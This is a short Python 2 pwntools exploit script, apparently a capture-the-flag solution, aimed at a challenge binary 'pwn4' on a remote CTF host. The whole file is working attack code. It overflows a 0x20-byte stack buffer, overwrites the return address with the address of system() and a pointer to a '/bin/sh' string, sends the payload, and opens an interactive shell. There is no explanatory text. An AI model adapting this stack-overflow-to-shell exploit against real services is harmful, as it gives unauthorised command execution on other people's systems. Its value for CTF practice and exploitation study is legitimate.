#!/usr/bin/env python2
#encoding: utf-8

from pwn import *

#context.log_level = 'debug'

binary = './pwn4'
bin_sh = 0x804a038
call_sys = 0x080485E4
sys_addr = 0x8048430
io = remote('pwn.ctf.tamu.edu', 4324)
#io = process(binary)

#gdb.attach(io, '''
#	q
#	b main
#''')

#offset = 0x20 + eip
ret = 0x080485EF
payload = 'a'*0x20 + pack(sys_addr) + pack(ret) + pack(bin_sh)

io.recvuntil('Input> ')
io.sendline(payload)

io.interactive()




